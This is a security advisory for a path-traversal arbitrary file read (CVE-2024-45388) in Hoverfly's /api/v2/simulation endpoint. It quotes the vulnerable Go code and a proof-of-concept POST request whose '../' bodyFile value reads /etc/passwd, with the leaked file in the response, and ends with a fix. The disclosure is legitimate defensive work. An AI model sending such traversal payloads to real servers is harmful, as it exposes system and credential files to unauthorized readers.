# Hoverfly allows an arbitrary file read in the `/api/v2/simulation` endpoint (`GHSL-2023-274`)

**GHSA**: GHSA-6xx4-x46f-f897 | **CVE**: CVE-2024-45388 | **Severity**: high (CVSS 7.5)

**CWE**: CWE-22, CWE-200

**Affected Packages**:
- **github.com/spectolabs/hoverfly** (go): < 1.10.3

## Description

### Details

The `/api/v2/simulation` [POST handler](https://github.com/spectolabs/hoverfly/blob/15d6ee9ea4e0de67aec5a41c28d21dc147243da0/core/handlers/v2/simulation_handler.go#L87) allows users to create new simulation views from the contents of a user-specified file. This feature can be abused by an attacker to read arbitrary files from the Hoverfly server.

```go
# https://github.com/spectolabs/hoverfly/blob/15d6ee9ea4e0de67aec5a41c28d21dc147243da0/core/hoverfly_funcs.go#L186
func (hf *Hoverfly) readResponseBodyFile(filePath string) (string, error) {
	if filepath.IsAbs(filePath) {
		return "", fmt.Errorf("bodyFile contains absolute path (%s). only relative is supported", filePath)
	}

	fileContents, err := ioutil.ReadFile(filepath.Join(hf.Cfg.ResponsesBodyFilesPath, filePath))
	if err != nil {
		return "", err
	}

	return string(fileContents[:]), nil
}
```

Note that, although the code prevents absolute paths from being specified, an attacker can escape out of the `hf.Cfg.ResponsesBodyFilesPath` base path by using `../` segments and reach any arbitrary files.

This issue was found using the [Uncontrolled data used in path expression CodeQL query for python](https://codeql.github.com/codeql-query-help/go/go-path-injection/).
#### Proof of Concept

Send the following `POST` request to read the `/etc/passwd` file:

```http
POST /api/v2/simulation HTTP/1.1
Host: localhost:8888
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 128

{"data":{"pairs":[{
"request":{},"response": {
"bodyFile": "../../../../../etc/passwd"}} ]},"meta":{"schemaVersion":"v5.2"}}

```

Response will contain the Hoverfly's server `/etc/passwd`
```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Date: Tue, 19 Dec 2023 20:59:16 GMT
Content-Length: 1494
Connection: close

{"data":{"pairs":[{"request":{},"response":{"status":0,"body":"root:x:0:0:root:/root:/bin/ash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/mail:/sbin/nologin\nnews:x:9:13:news:/usr/lib/news:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\nman:x:13:15:man:/usr/man:/sbin/nologin\npostmaster:x:14:12:postmaster:/var/mail:/sbin/nologin\ncron:x:16:16:cron:/var/spool/cron:/sbin/nologin\nftp:x:21:21::/var/lib/ftp:/sbin/nologin\nsshd:x:22:22:sshd:/dev/null:/sbin/nologin\nat:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin\nsquid:x:31:31:Squid:/var/cache/squid:/sbin/nologin\nxfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin\ngames:x:35:35:games:/usr/games:/sbin/nologin\ncyrus:x:85:12::/usr/cyrus:/sbin/nologin\nvpopmail:x:89:89::/var/vpopmail:/sbin/nologin\nntp:x:123:123:NTP:/var/empty:/sbin/nologin\nsmmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin\nguest:x:405:100:guest:/dev/null:/sbin/nologin\nnobody:x:65534:65534:nobody:/:/sbin/nologin\n","bodyFile":"../../../../../etc/passwd","encodedBody":false,"templated":false}}],"globalActions":{"delays":[],"delaysLogNormal":[]}},"meta":{"schemaVersion":"v5.2","hoverflyVersion":"v1.6.1","timeExported":"2023-12-19T20:59:16Z"}}

```

#### Impact

This issue may lead to Information Disclosure.
#### Remediation

The code is [preventing absolute paths from being read](https://github.com/spectolabs/hoverfly/blob/15d6ee9ea4e0de67aec5a41c28d21dc147243da0/core/hoverfly_funcs.go#L186). Make sure the final path (`filepath.Join(hf.Cfg.ResponsesBodyFilesPath, filePath)`) is contained within the expected base path (`filepath.Join(hf.Cfg.ResponsesBodyFilesPath, "/")`)
